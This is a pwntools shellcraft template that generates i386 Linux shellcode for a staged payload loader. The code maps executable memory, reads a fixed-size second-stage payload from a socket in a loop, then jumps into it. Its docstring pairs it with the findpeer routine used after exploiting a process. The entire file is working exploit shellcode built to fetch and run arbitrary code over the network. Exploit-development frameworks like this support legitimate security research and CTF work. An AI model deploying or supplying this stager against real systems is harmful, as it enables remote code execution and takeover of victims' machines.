<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft import i386 %>
<% from pwnlib.shellcraft.i386 import linux %>
<% from pwnlib.constants import SYS_mmap2, SYS_read, PROT_EXEC, PROT_WRITE, PROT_READ, MAP_ANON, MAP_PRIVATE %>
<%docstring>
Recives a fixed sized payload into a mmaped buffer
Useful in conjuncion with findpeer.
Args:
    sock, the socket to read the payload from.
    size, the size of the payload
</%docstring>
<%page args="sock, size, handle_error=False"/>
<%
    stager = common.label("stager")
    looplabel = common.label("read_loop")
    errlabel = common.label("error")
%>
${stager}:
    push ${sock}
    ${i386.linux.syscall(SYS_mmap2, 0, size, PROT_EXEC+PROT_WRITE+PROT_READ,  MAP_ANON+MAP_PRIVATE, 0xffffffff, 0)}
    mov ecx, eax
    pop ebx /* sock */
    push ecx /* save for: pop eax; call eax later */
    ${i386.mov("edx", size)}

/* read/recv loop */
${looplabel}:
    ${i386.linux.syscall(SYS_read, 'ebx', 'ecx', 'edx')}
    test eax, eax
% if handle_error:
    js ${errlabel}
    sub edx, eax
% endif
    add ecx, eax
    test edx, edx
    jne ${looplabel}

    pop eax /* start of mmaped buffer */
    push ebx /* sock */
    call eax /* jump and hope for it to work */

% if handle_error:
${errlabel}:
    hlt
% endif
